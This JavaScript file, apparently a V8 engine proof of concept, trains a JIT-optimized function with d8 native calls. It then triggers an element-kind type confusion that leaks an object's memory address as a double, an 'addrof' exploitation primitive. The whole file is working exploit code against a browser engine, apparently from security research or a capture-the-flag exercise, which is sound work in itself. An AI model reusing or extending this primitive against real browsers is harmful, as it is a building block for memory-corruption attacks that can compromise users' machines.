/*************************************************************
 * File Name: addr_of.js
 * 
 * Created on: 2020-09-17 05:49:28
 * Author: raycp
 * 
 * Last Modified: 2020-09-17 06:23:02
 * Description: 
************************************************************/
function opt(a, b, obj) {
    b[0] = 0;
    a.length;
    a[0] = obj;
    
    return b[0];
}

let holey_obj_arr = new Array(1);
holey_obj_arr[0] = 'a';

%PrepareFunctionForOptimization(opt);

let packed_double_arr1 = [1.1]
opt(holey_obj_arr, packed_double_arr1, holey_obj_arr);
opt(holey_obj_arr, packed_double_arr1, holey_obj_arr);

let packed_double_arr2 = [2.2]
opt(packed_double_arr2, packed_double_arr1, holey_obj_arr);
let packed_double_arr3 = [2.2]
opt(packed_double_arr3, packed_double_arr1, holey_obj_arr);
%OptimizeFunctionOnNextCall(opt);

let evil_arr = [0.1];
let addr = opt(evil_arr, evil_arr, holey_obj_arr);
print(addr);
